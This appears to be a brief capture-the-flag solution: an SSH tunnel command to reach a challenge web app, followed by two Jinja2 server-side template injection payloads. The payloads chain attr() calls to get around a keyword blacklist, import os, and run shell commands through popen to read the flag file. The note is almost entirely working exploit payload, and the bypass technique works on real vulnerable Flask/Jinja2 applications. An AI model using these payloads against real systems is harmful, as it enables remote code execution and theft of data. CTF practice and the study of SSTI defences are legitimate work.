- create an ssh tunnel to the web app `ssh -o IdentitiesOnly=yes -o PreferredAuthentications=password  -L 8080:172.99.0.2:80 ctfplayer@host -p 2222` 

- break the ssti blacklist `{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')(request|attr('args')|attr('get')('flag'))|attr('read')()}}&flag=cat%20flag.txt`
or `{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('cat fl*')|attr('read')()}}`